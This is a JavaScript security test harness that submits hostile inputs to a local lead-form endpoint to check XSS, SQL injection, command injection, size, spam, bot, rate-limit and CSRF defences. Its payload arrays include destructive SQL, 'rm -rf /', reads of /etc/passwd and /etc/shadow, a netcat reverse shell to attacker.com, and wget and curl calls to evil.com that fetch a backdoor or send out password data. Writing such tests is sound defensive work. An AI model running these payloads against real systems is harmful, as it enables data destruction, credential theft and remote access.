const testPayloads = {
    xssAttempts: [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "data:text/html,<script>alert('xss')</script>",
        "<iframe src=javascript:alert('xss')></iframe>",
        "<body onload=alert('xss')>",
        "<a href='javascript:alert(\"xss\")'>click</a>",
        "\\u003cscript\\u003ealert('xss')\\u003c/script\\u003e",
        "%3Cscript%3Ealert('xss')%3C/script%3E",
    ],
    sqlInjectionAttempts: [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'; UPDATE users SET password='hacked' WHERE id=1; --",
        "1 UNION SELECT password FROM users",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "1' AND 1=1",
        "' OR 'x'='x",
        "1'; DELETE FROM users; --",
        "admin'/*",
        "1 OR 1=1#",
    ],
    commandInjectionAttempts: [
        "; ls -la",
        "| cat /etc/passwd",
        "; rm -rf /",
        "&& whoami",
        "$(cat /etc/shadow)",
        "`id`",
        "'; cat /etc/passwd #",
        "| nc attacker.com 4444 -e /bin/bash",
        "; wget http://evil.com/backdoor.sh",
        "&& curl -d @/etc/passwd http://evil.com/",
    ],
    oversizedPayloads: [
        "A".repeat(10000),
        "B".repeat(100000),
        "C".repeat(1000000),
    ],
    malformedData: [
        null,
        undefined,
        "",
        {},
        [],
        123,
        true,
        false,
    ],
    spamPatterns: [
        "URGENT!!! ACT NOW!!! LIMITED TIME OFFER!!!",
        "You've won $1,000,000! Click here to claim!",
        "Buy VIAGRA and CIALIS cheap online!",
        "Casino poker lottery winner congratulations",
        "CLICK HERE NOW! DONT MISS OUT!",
        "FREE MONEY! GET RICH QUICK!",
        "Weight loss miracle! Lose 50 pounds in 1 week!",
    ],
    botIndicators: [
        { userAgent: "curl/7.68.0" },
        { userAgent: "python-requests/2.25.1" },
        { userAgent: "wget/1.20.3" },
        { userAgent: "Mozilla/5.0 (compatible; bot/1.0)" },
        { userAgent: "Googlebot/2.1" },
        { userAgent: "PhantomJS/2.1.1" },
        { userAgent: "HeadlessChrome/91.0.4472" },
        { userAgent: "Selenium/3.141.59" },
    ],
};
class SecurityTester {
    constructor(baseUrl = 'http://localhost:3002') {
        this.baseUrl = baseUrl;
        this.results = {
            passed: 0,
            failed: 0,
            total: 0,
            details: []
        };
    }
    async runAllTests() {
        console.log('🔒 Starting Security Test Suite');
        console.log('================================\n');
        await this.testXSSProtection();
        await this.testSQLInjectionProtection();
        await this.testCommandInjectionProtection();
        await this.testOversizedPayloads();
        await this.testMalformedData();
        await this.testSpamDetection();
        await this.testBotDetection();
        await this.testRateLimiting();
        await this.testCSRFProtection();
        this.printResults();
    }
    async testXSSProtection() {
        console.log('🧪 Testing XSS Protection...');
        for (const payload of testPayloads.xssAttempts) {
            await this.testFormSubmission('XSS', {
                name: payload,
                company: 'Test Company',
                email: 'test@example.com',
                specificIssue: 'Testing XSS protection'
            }, true, 'XSS payload should be blocked or sanitized');
        }
    }
    async testSQLInjectionProtection() {
        console.log('🧪 Testing SQL Injection Protection...');
        for (const payload of testPayloads.sqlInjectionAttempts) {
            await this.testFormSubmission('SQL Injection', {
                name: 'Test User',
                company: payload,
                email: 'test@example.com',
                specificIssue: 'Testing SQL injection protection'
            }, true, 'SQL injection should be blocked');
        }
    }
    async testCommandInjectionProtection() {
        console.log('🧪 Testing Command Injection Protection...');
        for (const payload of testPayloads.commandInjectionAttempts) {
            await this.testFormSubmission('Command Injection', {
                name: 'Test User',
                company: 'Test Company',
                email: 'test@example.com',
                specificIssue: payload
            }, true, 'Command injection should be blocked');
        }
    }
    async testOversizedPayloads() {
        console.log('🧪 Testing Oversized Payload Protection...');
        for (const payload of testPayloads.oversizedPayloads) {
            await this.testFormSubmission('Oversized Payload', {
                name: 'Test User',
                company: 'Test Company',
                email: 'test@example.com',
                specificIssue: payload
            }, true, `${payload.length} byte payload should be rejected`);
        }
    }
    async testMalformedData() {
        console.log('🧪 Testing Malformed Data Handling...');
        for (const payload of testPayloads.malformedData) {
            await this.testFormSubmission('Malformed Data', {
                name: payload,
                company: 'Test Company',
                email: 'test@example.com',
                specificIssue: 'Testing malformed data'
            }, true, `Malformed data (${typeof payload}) should be rejected`);
        }
    }
    async testSpamDetection() {
        console.log('🧪 Testing Spam Detection...');
        for (const payload of testPayloads.spamPatterns) {
            await this.testFormSubmission('Spam Detection', {
                name: 'Spammer',
                company: 'Spam Corp',
                email: 'spam@spam.com',
                specificIssue: payload
            }, true, 'Spam content should be detected and flagged');
        }
    }
    async testBotDetection() {
        console.log('🧪 Testing Bot Detection...');
        for (const botData of testPayloads.botIndicators) {
            await this.testFormSubmission('Bot Detection', {
                name: 'Bot User',
                company: 'Bot Company',
                email: 'bot@bot.com',
                specificIssue: 'I am definitely not a bot'
            }, true, `Bot with ${botData.userAgent} should be detected`, botData.userAgent);
        }
    }
    async testRateLimiting() {
        console.log('🧪 Testing Rate Limiting...');
        const promises = [];
        for (let i = 0; i < 10; i++) {
            promises.push(this.testFormSubmission('Rate Limiting', {
                name: `User ${i}`,
                company: `Company ${i}`,
                email: `user${i}@test.com`,
                specificIssue: `Rapid request ${i}`
            }, i > 5, `Request ${i} should ${i > 5 ? 'be rate limited' : 'succeed'}`));
        }
        await Promise.all(promises);
    }
    async testCSRFProtection() {
        console.log('🧪 Testing CSRF Protection...');
        await this.testFormSubmission('CSRF Protection', {
            name: 'Test User',
            company: 'Test Company',
            email: 'test@example.com',
            specificIssue: 'Testing CSRF protection'
        }, true, 'Request without CSRF token should be rejected');
        await this.testFormSubmission('CSRF Protection', {
            name: 'Test User',
            company: 'Test Company',
            email: 'test@example.com',
            specificIssue: 'Testing CSRF protection',
            csrfToken: 'invalid-token-12345'
        }, true, 'Request with invalid CSRF token should be rejected');
    }
    async testFormSubmission(testName, payload, shouldFail, description, userAgent = null) {
        try {
            const headers = {
                'Content-Type': 'application/json',
            };
            if (userAgent) {
                headers['User-Agent'] = userAgent;
            }
            const response = await fetch(`${this.baseUrl}/api/forms/lead`, {
                method: 'POST',
                headers,
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            const testPassed = shouldFail ? !result.success || response.status >= 400 : result.success;
            if (testPassed) {
                this.results.passed++;
                console.log(`  ✅ ${testName}: ${description}`);
            }
            else {
                this.results.failed++;
                console.log(`  ❌ ${testName}: ${description}`);
                console.log(`     Expected: ${shouldFail ? 'FAIL' : 'SUCCESS'}, Got: ${result.success ? 'SUCCESS' : 'FAIL'}`);
                console.log(`     Response:`, result);
            }
            this.results.total++;
            this.results.details.push({
                testName,
                description,
                expected: shouldFail ? 'FAIL' : 'SUCCESS',
                actual: result.success ? 'SUCCESS' : 'FAIL',
                passed: testPassed,
                response: result
            });
        }
        catch (error) {
            this.results.failed++;
            this.results.total++;
            console.log(`  ❌ ${testName}: ${description} - Error: ${error.message}`);
            this.results.details.push({
                testName,
                description,
                expected: shouldFail ? 'FAIL' : 'SUCCESS',
                actual: 'ERROR',
                passed: false,
                error: error.message
            });
        }
        await new Promise(resolve => setTimeout(resolve, 100));
    }
    printResults() {
        console.log('\n🔒 Security Test Results');
        console.log('========================');
        console.log(`Total Tests: ${this.results.total}`);
        console.log(`Passed: ${this.results.passed} ✅`);
        console.log(`Failed: ${this.results.failed} ❌`);
        console.log(`Success Rate: ${((this.results.passed / this.results.total) * 100).toFixed(2)}%`);
        if (this.results.failed > 0) {
            console.log('\n❌ Failed Tests:');
            this.results.details
                .filter(test => !test.passed)
                .forEach(test => {
                console.log(`  - ${test.testName}: ${test.description}`);
                console.log(`    Expected: ${test.expected}, Actual: ${test.actual}`);
            });
        }
        const criticalFailures = this.results.details.filter(test => !test.passed && (test.testName.includes('XSS') || test.testName.includes('SQL') || test.testName.includes('Command')));
        if (criticalFailures.length > 0) {
            console.log('\n🚨 CRITICAL SECURITY VULNERABILITIES DETECTED! 🚨');
            console.log('These must be fixed before production deployment.');
        }
        else {
            console.log('\n🛡️ All critical security tests passed!');
        }
    }
}
if (typeof require !== 'undefined' && require.main === module) {
    const tester = new SecurityTester();
    tester.runAllTests().catch(console.error);
}
module.exports = { SecurityTester, testPayloads };
